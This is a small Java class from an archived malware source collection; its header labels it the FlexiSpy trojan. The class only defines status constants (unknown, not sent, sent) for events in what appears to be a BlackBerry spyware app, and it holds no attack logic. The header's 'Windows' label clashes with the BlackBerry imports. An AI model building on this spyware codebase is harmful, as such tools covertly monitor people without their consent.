/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.event.constant;

import net.rim.device.api.util.Persistable;

public class FxStatus implements Persistable {

	public static final FxStatus UNKNOWN = new FxStatus(0);
	public static final FxStatus NOT_SEND = new FxStatus(1);
	public static final FxStatus SENT = new FxStatus(2);
	private int id;
	
	private FxStatus(int id) {
		this.id = id;
	}
	
	public int getId() {
		return id;
	}
	
	public boolean equals(FxStatus obj) {
		return this.id == obj.id;
	} 
}
